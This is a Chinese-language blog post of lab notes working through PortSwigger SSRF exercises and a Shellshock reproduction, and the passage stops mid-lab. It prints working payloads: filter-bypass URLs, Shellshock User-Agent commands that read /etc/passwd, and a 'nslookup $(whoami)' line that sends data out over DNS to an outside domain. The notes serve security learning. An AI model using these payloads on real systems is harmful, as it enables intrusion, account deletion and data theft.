
<!DOCTYPE html>
<html lang="zh ">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FHK_KMD终晨 || _coding_</title>
    <meta name="author" content="FHK_KMD6377">
    <meta name="description" content="所有所得所获,不如一夜星空 ------<<三体导读>> ">
    <meta name="keywords" content=" ">
    <link rel="icon" href="/images/avatar.png">
    <link rel="stylesheet" href="/css/antd.min.css">
    
    <link rel="stylesheet" href="/css/full-theme.css">
    
    <script src="/js/vue.js"></script>
    <script src="/js/antd.min.js"></script>
<meta name="generator" content="Hexo 6.3.0"></head>

<body>

    <div id="loading"
        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
        <div
            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
            <div id="loadcontent"
                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
                <div>
                    <h2>LOADING...</h2>
                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
                    <div>
                        <img src="/dancingkitty.gif" alt="loading">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="layout">
        <transition name="into">
            <div v-show="show_page" style="display: none;">
                <div id="menu_show">
                     
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">FHK_KMD终晨</span>
        </a>
        
        <a href="/">
            <span>
                <a-icon type="home" theme="filled" />
            </span>
            <span>home</span>
        </a>
        
        <a href="/about">
            <span>
                <a-icon type="idcard" theme="filled" />
            </span>
            <span>about</span>
        </a>
        
        <a href="/archives">
            <span>
                <a-icon type="folder" theme="filled" />
            </span>
            <span>archives</span>
        </a>
        
        <a href="/like/categories">
            <span>
                <a-icon type="book" theme="filled" />
            </span>
            <span>categories</span>
        </a>
        
        <a href="/like/tags">
            <span>
                <a-icon type="tags" theme="filled" />
            </span>
            <span>tags</span>
        </a>
        
        <a target="_blank" rel="noopener" href="https://en.korilin.com">
            <span>
                <a-icon type="compass" theme="filled" />
            </span>
            <span>英文博客</span>
        </a>
        
    </div>

    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div :class="'title'" @click="menu_show=!menu_show">
            <span style="margin-right: 10px;">
                <a-icon type="appstore" theme="filled" />
            </span>
            <span>FHK_KMD终晨</span>
        </div>
        <div class="items" v-show="menu_show">
            
            <a href="/">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="home" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
                </div>
            </a>
            
            <a href="/about">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="idcard" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
                </div>
            </a>
            
            <a href="/archives">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="folder" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
                </div>
            </a>
            
            <a href="/like/categories">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="book" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
                </div>
            </a>
            
            <a href="/like/tags">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="tags" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
                </div>
            </a>
            
            <a target="_blank" rel="noopener" href="https://en.korilin.com">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="compass" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
                </div>
            </a>
            
        </div>
        <div class="curtain" v-show="menu_show"></div>
    </div>

</nav>
                </div>

                <div id="main">
                     
<link rel="stylesheet" href="/css/post-body.css">
<div class="article">
    <div>
        <h1> </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2024/9/23
        </span>

        

        
    </div>

    <div class="content" v-pre>
        <p>Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.<br>就是伪造成服务端</p>
<h3 id="Basic-SSRF-against-the-local-server"><a href="#Basic-SSRF-against-the-local-server" class="headerlink" title="Basic SSRF against the local server"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">Basic SSRF against the local server</a></h3><p><img src="/attachment/Pasted%20image%2020240514153559.png"><br>这里有一个check stock检查库存的功能<br>数据包是这样的<br><img src="/attachment/Pasted%20image%2020240514153633.png"><br>通过url解码可以看到<code>stockApi</code>是<img src="/attachment/Pasted%20image%2020240514153653.png"></p>
<p>为什么会有这个stockApi呢?</p>
<blockquote>
<p>例如，假设有一个购物应用程序，它允许用户查看某个商店中某件商品是否有货。为了提供库存信息，该应用程序必须查询各种后端 REST API。它通过前端 HTTP 请求将 URL 传递到相关的后端 API 端点来实现这一点。当用户查看某件商品的库存状态时，他们的浏览器会发出以下请求：</p>
</blockquote>
<pre><code>POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
</code></pre>
<blockquote>
<p>这会导致服务端向特定的url发送一个请求取回库存的状态, 再返回给用户</p>
</blockquote>
<p>靶场的介绍中说这个网站有一个<a target="_blank" rel="noopener" href="http://localhost/admin%E7%95%8C%E9%9D%A2">http://localhost/admin界面</a>, 但是你直接通过url访问是不能进去的, 因为你现在不在内网环境里面也没有登录管理员账号<br><img src="/attachment/Pasted%20image%2020240514153910.png"></p>
<p>这时候就可以利用刚才那个<code>stockApi</code><br>由于这个stockApi由服务端去访问的, 在内网环境里面, 请求来自本地, 那么我们就可以访问到页面了</p>
<p>所以在这里更改刚才的数据包再发送出去<br><img src="/attachment/Pasted%20image%2020240514154305.png"><br>就看到了admin页面, 这个页面的内容是服务端拉取再返回给用户的</p>
<p>靶场要求删除这名叫carlos的用户</p>
<p>那么我们找到删除用户的API<br><img src="/attachment/Pasted%20image%2020240514154502.png"><br>还是用<code>stockApi</code>发送这个url <code>http://localhost/admin/delete?username=carlos</code><br><img src="/attachment/Pasted%20image%2020240514155052.png"><br>返回了一个302重定向界面</p>
<p>然后再回到&#x2F;admin界面, 就完成了靶场<br><img src="/attachment/Pasted%20image%2020240514155134.png"></p>
<p>整个过程下来就是在利用stockApi这个参数来代替我们自己去访问网站</p>
<h3 id="Basic-SSRF-against-another-back-end-system"><a href="#Basic-SSRF-against-another-back-end-system" class="headerlink" title="Basic SSRF against another back-end system"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system">Basic SSRF against another back-end system</a></h3><p>还是找到这个查看库存的数据包<br><img src="/attachment/Pasted%20image%2020240514155703.png"><br>url解码得到<br><img src="/attachment/Pasted%20image%2020240514155751.png"><br><code>stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&amp;storeId=1</code><br>题目要我们扫描内网<code>192.168.0.X:8080</code>的范围来找到admin的界面, 再利用admin删除carlos</p>
<p>将这个数据包发送到Intruder爆破模块<br><img src="/attachment/Pasted%20image%2020240514160117.png"><br>在1这个位置添加一个标记<br><img src="/attachment/Pasted%20image%2020240514160337.png"><br>然后转到payload这里这样设置<br><img src="/attachment/Pasted%20image%2020240514160455.png"><br>然后开始攻击, 等待它跑完</p>
<p>通过筛选返回的状态码, 可以看到</p>
<blockquote>
<p>192.168.0.177:8080返回的是404,<br>192.168.0.1:8080返回的是400,<br>而其他的都是500<br><img src="/attachment/Pasted%20image%2020240514160718.png"></p>
</blockquote>
<p>于是猜测这个地址是admin的地址, 发包<br><img src="/attachment/Pasted%20image%2020240514160913.png"><br>可以看到验证了猜想</p>
<p>然后是上一个的操作</p>
<h3 id="Blind-SSRF-with-out-of-band-detection"><a href="#Blind-SSRF-with-out-of-band-detection" class="headerlink" title="Blind SSRF with out-of-band detection"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind">Blind SSRF</a> with out-of-band detection</h3><p>使用DNS外带<br>打开靶场随便选择一个商品<br><img src="/attachment/Pasted%20image%2020240515002124.png"><br>发送到repeater<br><img src="/attachment/Pasted%20image%2020240515002318.png"><br>将这个Referer头插入payload, 然后发送, 这时候Referer就变成了我们burpsuite自己的DNS域名(记得在前面加上http:&#x2F;&#x2F;)<br><img src="/attachment/Pasted%20image%2020240515002559.png"><br>然后在burp的Collaborator模块里手动刷新(Poll now)<br><img src="/attachment/Pasted%20image%2020240515002657.png"><br>就看到了这些记录</p>
<h3 id="SSRF-with-blacklist-based-input-filter-bypass"><a href="#SSRF-with-blacklist-based-input-filter-bypass" class="headerlink" title="SSRF with blacklist-based input filter(bypass)"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">SSRF</a> with blacklist-based input filter(bypass)</h3><blockquote>
<p>Some applications block input containing hostnames like <code>127.0.0.1</code> and <code>localhost</code>, or sensitive URLs like <code>/admin</code>. In this situation, you can often circumvent(规避) the filter using the following techniques:</p>
</blockquote>
<ul>
<li>Use an alternative IP representation of <code>127.0.0.1</code>, such as <code>2130706433</code>, <code>017700000001</code>, or <code>127.1</code>.</li>
<li>Register your own domain name that resolves to <code>127.0.0.1</code>. You can use <code>spoofed.burpcollaborator.net</code> for this purpose.</li>
<li>Obfuscate(混淆) blocked strings using URL encoding or case variation.</li>
<li>Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols(协议) for the target URL. For example, switching from an <code>http:</code> to <code>https:</code> URL during the redirect has been shown to bypass some anti-SSRF filters.</li>
</ul>
<p>还是刚才那个检查库存的api<br><img src="/attachment/Pasted%20image%2020240518134312.png"><br>但是这时候直接发送localhost&#x2F;admin会发现被过滤了<br><img src="/attachment/Pasted%20image%2020240518134435.png"><br>换成127.0.0.1&#x2F;admin发现也是不行的<br><img src="/attachment/Pasted%20image%2020240518134500.png"><br>去掉admin, 也不行<br><img src="/attachment/Pasted%20image%2020240518134653.png"><br>将127.0.0.1换成127.1,  返回了常规网站界面<br><img src="/attachment/Pasted%20image%2020240518134713.png"><br>再加上&#x2F;admin  发现依然不行<br><img src="/attachment/Pasted%20image%2020240518134746.png"></p>
<p>说明<code>admin</code>也被ban了<br>将<code>admin</code>进行url编码, 发现还是失败<br><img src="/attachment/Pasted%20image%2020240518134932.png"></p>
<p>说明它可能在发送过去的时候后端就自动解码了, 这里我们可以将<code>admin</code>进行两次url编码<br><img src="/attachment/Pasted%20image%2020240518135501.png"><br><img src="/attachment/Pasted%20image%2020240518135438.png"><br>发送删除用户的api<br><img src="/attachment/Pasted%20image%2020240518135640.png"><br>发现成功删除用户</p>
<h3 id="SSRF-with-filter-bypass-via-open-redirection-vulnerability"><a href="#SSRF-with-filter-bypass-via-open-redirection-vulnerability" class="headerlink" title="SSRF with filter bypass via open redirection vulnerability"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">SSRF</a> with filter bypass via open redirection vulnerability</h3><p><img src="/attachment/Pasted%20image%2020240528175440.png"><br>靶场说这个192.168.0.12:8080是管理界面<br>但是这个stockApi被限制只能访问本地的应用</p>
<p>还是找到这个库存api<br><img src="/attachment/Pasted%20image%2020240528175418.png"><br>将地址替换为<code>http://192.168.0.12:8080/admin</code><br><img src="/attachment/Pasted%20image%2020240528175721.png"><br>提示说无效, 所以我们要找到一个可以用于重定向的地方</p>
<p>随便点击网站的一些别的按钮, 比如在这个<code>Next product</code><br><img src="/attachment/Pasted%20image%2020240530204159.png"></p>
<p><img src="/attachment/Pasted%20image%2020240528175905.png"><br>这里浏览器使用GET请求向<code>/product/nextProduct</code>界面发送了一个<code>currentProductId=1</code>参数和一个<code>path=/product?productId=2</code>参数<br>服务器返回了302重定向, 其中<code>Location</code>头代表了重定向的位置<br>可以看到, path参数指定了Location头的值, 也就是接下来要访问的地址</p>
<blockquote>
<p>服务端响应<code>3**</code>状态码时，服务端会告诉浏览器要跳转到哪个网址，此时就需要用到响应Header的Location属性<br>当浏览器响应的状态码为<code>3**</code>时，我们就需要用到<code>Location</code>这个属性，这个属性会告诉浏览器接下来要访问哪条资源路径</p>
</blockquote>
<p>这就是一种叫<code>open redirection</code>漏洞, 我们可以通过控制类似<code>path</code>这样的参数控制浏览器下一步重定向到哪里<br>因此我们可以利用这个漏洞让服务器成功访问到admin界面并返回给我们</p>
<p>这其中的过程大致如下(为了方便区分我使用服务端的某某地址来称呼, 其实都是一台机器):</p>
<ul>
<li>如果利用刚才那个地方的<code>stockApi</code>向服务端的这个地址<code>/product/stock</code>发送这一串字符串<code>/product/nextProduct?currentProductId=1&amp;path=/product?productId=2</code></li>
<li>那么服务端的就会访问<code>/product/nextProduct</code>这个地址(就是本地)并且发送两个这样的参数<code>currentProductId=1&amp;path=/product?productId=2</code></li>
<li><code>/product/nextProduct</code>这里个地方接收到之后, 就会让对方, 也就是服务器自己, 重定向到<code>/product?productId=2</code>这个地址<br><img src="/attachment/Pasted%20image%2020240530211923.png"><br><strong>注意, 实际上使用<code>stockApi</code>的时候记得把参数都进行一次url编码</strong><br>可以看到, 返回了下一件商品的页面</li>
<li>现在我们只需要把<code>path</code>参数替换为<code>http://192.168.0.12:8080/admin</code>就可以访问到管理界面</li>
</ul>
<h2 id="SSRF-with-whitelist-based-input-filters"><a href="#SSRF-with-whitelist-based-input-filters" class="headerlink" title="SSRF with whitelist-based input filters"></a>SSRF with whitelist-based input filters</h2><blockquote>
<p>有些应用程序只允许匹配的输入，即允许值的白名单。筛选器可能会在输入的开头或其中包含的内容中查找匹配项。可以利用URL解析中的不一致性绕过此筛选器。<br>&#x3D;&#x3D;Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.&#x3D;&#x3D;</p>
</blockquote>
<blockquote>
<p>URL规范包含许多特性，当URL使用此方法实现特别解析和验证时，这些特性可能会被忽略:<br>&#x3D;&#x3D;The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method: &#x3D;&#x3D;</p>
</blockquote>
<ul>
<li><p>你可以在主机名前面使用<code>@</code>嵌入证书&#x3D;&#x3D;You can embed credentials in a URL before the hostname, using the <code>@</code> character&#x3D;&#x3D;.<br>  For example:<code>https://expected-host:fakepassword@evil-host</code><br>  没找到资料, 我估计前面的是一种类似于登录的</p>
</li>
<li><p>使用<code>#</code>来指示URL的分段&#x3D;&#x3D;You can use the <code>#</code> character to indicate a URL fragment. For example:&#x3D;&#x3D;<br>  <code>https://evil-host#expected-host</code><br>  <a href="obsidian://open?vault=xiaod.web&file=%E5%85%B3%E4%BA%8Eurl%E4%B8%AD%EF%BC%83%E7%9A%84%E4%BD%9C%E7%94%A8">关于url中<code>#</code>的作用</a>  </p>
</li>
<li><p>可以利用 DNS 命名层次结构来放置你控制的充分认证后的DNS名。&#x3D;&#x3D;You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:&#x3D;&#x3D;<br>  <code>https://expected-host.evil-host</code></p>
</li>
<li><p>您可以对字符进行 URL 编码，以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式与执行后端 HTTP 请求的代码不同，则此功能特别有用。您还可以尝试对字符进行双重编码；某些服务器会递归对输入进行 URL 解码, 从而导致进一步的差异&#x3D;&#x3D;You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding">double-encoding</a> characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.&#x3D;&#x3D;</p>
</li>
<li><p>You can use combinations of these techniques together.</p>
</li>
</ul>
<p>还是这个靶场, 管理页面是这个<code>http://localhost/admin</code><br>检查库存<br><img src="/attachment/Pasted%20image%2020240629182021.png"><br><img src="/attachment/Pasted%20image%2020240630022411.png"></p>
<p><code>stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=1</code><br>这个靶场是有白名单的, 所以类似于<code>http://localhost/admin</code>这种是不允许访问的<br>检查器必须要检查是<code>stock.weliketoshop.net</code>这个域名才会放行<br>用@这种方式, 假装是以用户名进行访问<br><code>stockApi=http://username@stock.weliketoshop.net</code></p>
<p>但是这还不能访问到我们想要访问的admin<br>所以我们改为<code>http://localhost#@stock.weliketoshop.net</code><br>然后再对<code>#</code>进行两次url编码即<code>%2523</code><br>得到<br><code>http://localhost%2523@stock.weliketoshop.net</code><br>然后发送, 就会发现可以被接收<br><img src="/attachment/Pasted%20image%2020240630025501.png"><br>为什么这个可以被接收呢?<br>首先我们输入的是<code>http://localhost%2523@stock.weliketoshop.net</code><br>进行一次解码之后, 那个检查域名的程序看到的就是<code>http://localhost%23@stock.weliketoshop.net</code>它会以为@前面的是用户名, 它看到右边的确实是正确的域名之后就放行了<br>最后被目标服务器接收到的时候又经过了一次url解码, 目标服务器看到的是<code>http://localhost#@stock.weliketoshop.net</code>, 它认为#后面的是对于http消息传递中没用的信息(具体看<code>#</code>的作用)于是最后访问的是localhost</p>
<p>如果要访问admin的话, payload就需要是<br><code>http://localhost%2523@stock.weliketoshop.net/admin</code><br>成功访问<br><img src="/attachment/Pasted%20image%2020240630030110.png"><br>删除用户<br><img src="/attachment/Pasted%20image%2020240630030150.png"></p>
<h2 id="Blind-SSRF-with-Shellshock-exploitation"><a href="#Blind-SSRF-with-Shellshock-exploitation" class="headerlink" title="Blind SSRF with Shellshock exploitation"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind">Blind SSRF</a> with Shellshock exploitation</h2><p>这是涉及到一个Linux破壳漏洞<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/14248937.html"># Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析</a><br><a target="_blank" rel="noopener" href="https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</a></p>
<p>GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。</p>
<p>这个漏洞的英文是：<strong>ShellShock</strong>，中文名被XCERT命名为：破壳漏洞。</p>
<p>该漏洞在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10中均拥有存在CVE-2014-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac OS X，而针对这些操作系统管理下的数据均存在高危威胁。</p>
<p>漏洞的利用方式会通过与Bash交互的多种应用展开，包括HTTP、OpenSSH、DHCP等</p>
<h3 id="本地漏洞检测"><a href="#本地漏洞检测" class="headerlink" title="本地漏洞检测"></a>本地漏洞检测</h3><p>搭建一个vulhub靶场, <code>docker-compose up -d</code></p>
<p>具体搭建过程<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/14248937.html"># Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析</a></p>
<p><a target="_blank" rel="noopener" href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105111432.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105111432.png"></a></p>
<p>进入<code>docker</code>容器</p>
<p><code>payload</code>为： <code>env x=&#39;() &#123; :;&#125;; echo shellshocked&#39; bash –c &quot;echo hi&quot;</code></p>
<p><a target="_blank" rel="noopener" href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105112350.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105112350.png"></a></p>
<p>命令解释如下(&#x3D;&#x3D;这部分看不懂没关系, 看完下面的漏洞原理再回来&#x3D;&#x3D;)：</p>
<p><code>env x=&#39;() &#123; :;&#125;; echo shellshocked&#39; bash -c &quot;echo hi&quot;</code></p>
<ul>
<li><code>env</code>: 这个命令用来设置环境变量。</li>
<li><code>x=&#39;() &#123; :;&#125;; echo shellshocked&#39;</code>: 这里设置了一个名为<code>x</code>的环境变量，其值为一个函数定义，该函数什么也不做（<code>:</code>是空操作，<code>;</code>是分隔符），然后输出<code>shellshocked</code>。</li>
<li><code>bash -c &quot;echo hi&quot;</code>: 这是启动一个新的bash会话，并执行<code>-c</code>选项后面的命令，即<code>echo hi</code>。</li>
</ul>
<p>漏洞利用的关键点在于，当<code>bash -c</code>启动一个新的bash会话时，它会从环境变量中读取函数定义。由于<code>x</code>变量被设置为一个函数定义，bash会话会读取这个定义并执行它。这就是为什么你会看到<code>shellshocked</code>被输出的原因。</p>
<p>这个命令执行后，首先输出<code>shellshocked</code>，然后是<code>echo hi</code>命令的结果，即<code>hi</code>。</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>口语化阐释一下漏洞原理：<code>父进程中的特殊变量字符串(这里指字符串内容为函数)成为环境变量后，在子进程中调用该字符串时将其理解为函数执行</code></p>
<p>在<code>shell</code>中函数定义：<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-shell-func.html">https://www.runoob.com/linux/linux-shell-func.html</a></p>
<pre><code class="bash">#!/bin/bash
# author:菜鸟教程
# url:www.runoob.com

demoFun()&#123;
    echo &quot;这是我的第一个 shell 函数!&quot;
&#125;
echo &quot;-----函数开始执行-----&quot;
demoFun
echo &quot;-----函数执行完毕-----&quot;
</code></pre>
<p>在<code>shell</code>中定义变量<br><code>springbird=&quot;hi&quot;</code></p>
<p>使用<code>echo</code>输出</p>
<p><a target="_blank" rel="noopener" href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115013.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115013.png"></a></p>
<p>然后开启以后新的进程后，可以看到<code>$springbird</code>变量没有继承到子进程中来<br>那么我们怎么样才能在子进程中使用父进程的变量呢？(自问自答)<br>可以将变量存储到环境变量中，这样就可以在父子进程中一起使用该变量了<br>我们使用<code>export</code>命令将其设置为环境变量，<code>export</code>简介：<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-export.html">https://www.runoob.com/linux/linux-comm-export.html</a></p>
<p>如图：</p>
<p><a target="_blank" rel="noopener" href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115444.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115444.png"></a></p>
<p>可以看到设置环境变量后子进程也能够使用该变量了</p>
<p>这个时候我们设置一个函数作为环境变量</p>
<p><code>x()&#123; echo &quot;test&quot;; &#125;</code></p>
<p>如图</p>
<p><a target="_blank" rel="noopener" href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115653.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115653.png"></a></p>
<p>可以看到子进程中也能成功执行该函数</p>
<p>这时候我们改变一点点<br>创建字符串环境变量<code>springbird</code><br><code>export springbird=&#39;() &#123; cat /etc/passwd;&#125;&#39;</code></p>
<p><a target="_blank" rel="noopener" href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105123724.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105123724.png"></a></p>
<p><strong>注意</strong>：</p>
<p><code>()</code>和<code>&#123;</code>之间有空格</p>
<p>可以看到我们创建的字符串变量被设置成环境变量后在子进程解释成了函数执行，成功读取了 <code>/etc/passwd</code></p>
<h3 id="阶段总结"><a href="#阶段总结" class="headerlink" title="阶段总结"></a>阶段总结</h3><p>把上面的操作合起来就是<code>env x=&#39;() &#123; echo accsessme;&#125;; echo vulnerable&#39; bash -c &#39;x&#39;</code><br><a target="_blank" rel="noopener" href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105124137.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105124137.png"></a></p>
<p>这里发生了以下步骤：</p>
<ol>
<li><code>env</code> 命令设置了一个名为 <code>x</code> 的环境变量，其值是一个函数定义，该函数输出 <code>accsessme</code>，然后是 <code>;</code> 分号和 <code>echo vulnerable</code>。</li>
<li><code>bash -c &#39;x&#39;</code> 命令启动一个新的 Bash 会话，并告诉它执行字符串 <code>&#39;x&#39;</code>。由于这是在命令行中，Bash 会首先解析 <code>x</code> 环境变量的值。</li>
<li>由于Shellshock漏洞，Bash 在解析环境变量时会错误地执行环境变量值中的函数定义。因此，<code>x</code> 环境变量被当作函数定义来执行，输出 <code>accsessme</code>。</li>
<li>然而，由于命令行解析的方式，<code>bash -c &#39;x&#39;</code> 这部分实际上首先执行了 <code>echo vulnerable</code> 命令。这是因为在命令行解析过程中，<code>-c &#39;x&#39;</code> 指定的字符串 <code>&#39;x&#39;</code> 被当作命令执行，而环境变量 <code>x</code> 的值被当作该命令的参数。</li>
<li>因此，<code>echo vulnerable</code> 首先执行，输出 <code>vulnerable</code>。</li>
<li>然后，由于环境变量 <code>x</code> 被设置为包含函数定义，Bash 尝试执行这个函数定义，输出 <code>accsessme</code>。</li>
</ol>
<p>所以，输出的顺序是 <code>vulnerable</code> 首先被输出，然后是 <code>accsessme</code>，这是因为命令行解析和执行的方式，以及Shellshock漏洞允许环境变量中的函数定义被执行。</p>
<p>触发并利用破壳漏洞的所需要的几点：</p>
<ul>
<li>被攻击的bash存在漏洞（版本小于等于4.3）</li>
<li>攻击者可以控制环境变量</li>
<li>新的bash进程被打开触发漏洞并执行命令</li>
</ul>
<p>从上面的分析中可以看出，漏洞的根本原因存在于Bash的ENV命令实现上，因此漏洞本身是不能够直接导致远程代码执行的。如果要达到远程代码执行的目的，必须借助第三方服务程序作为媒介才能够实现，第三方服务程序也必须要满足众多条件才可以充当此媒介的角色。</p>
<p>该<code>Bash</code>使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令<code>ENV</code>中解析成函数后，<code>Bash</code>执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p>
<h3 id="web漏洞检测"><a href="#web漏洞检测" class="headerlink" title="web漏洞检测"></a>web漏洞检测</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析 - 春告鳥 - 博客园 (cnblogs.com)</a><br>启动vulhub靶场—-Bash Shellshock 破壳漏洞（CVE-2012-6271）(搭建这个b玩意搞端口转发花了我一个多小时)<br>编译运行：</p>
<pre><code>docker compose up -d
</code></pre>
<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
<p>其中数据包原本是这样的<br><img src="/attachment/Pasted%20image%2020240611001752.png"></p>
<p>将payload附在User-Agent中访问victim.cgi：</p>
<pre><code>User-Agent: () &#123; foo; &#125;; echo Content-Type: text/plain; echo; /usr/bin/id
</code></pre>
<p>命令成功被执行：<br><img src="/attachment/Pasted%20image%2020240611003037.png"><br>同样的数据包访问safe.cgi，不受影响：<br><img src="/attachment/Pasted%20image%2020240611003107.png"></p>
<p>当然这个漏洞也可以执行别的命令比如说<code>cat /etc/passwd</code><br><img src="/attachment/Pasted%20image%2020240611003449.png"></p>
<h3 id="开始正题"><a href="#开始正题" class="headerlink" title="开始正题"></a>开始正题</h3><p>访问靶场<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation">Lab: Blind SSRF with Shellshock exploitation | Web Security Academy (portswigger.net)</a><br>靶场说, 该网站使用分析软件，当加载产品页面时，该软件会获取Referer标头中指定的URL。<br>所以我们要在referer头中插入我们想让它访问的网站, 也就是内部网络中<code>192.168.0.X:8080</code>的管理界面</p>
<p>当我们点击其中一个产品的时候抓取的数据包如下<br><img src="/attachment/Pasted%20image%2020240611005908.png"><br>在intruder模块中添加爆破ip地址(即192.168.0.1~192.168.0.254)<br><img src="/attachment/Pasted%20image%2020240611010031.png"><br><img src="/attachment/Pasted%20image%2020240611010056.png"><br>这里先不着急开始攻击</p>
<p>我们还要在UA中添加payload</p>
<p>由于这里没有回显, 所以使用DNS外带的方式</p>
<p><code>nslookup</code>命令可以请求一个域名<br>我们可以构造出这个命令<code>nslookup $(whoami).yuming.com</code><br>使用$(whoami)查询出当前的用户名, 如此一来, 用户名就会被拼接到后面的字符串中, 进而被我们查到DNS解析记录</p>
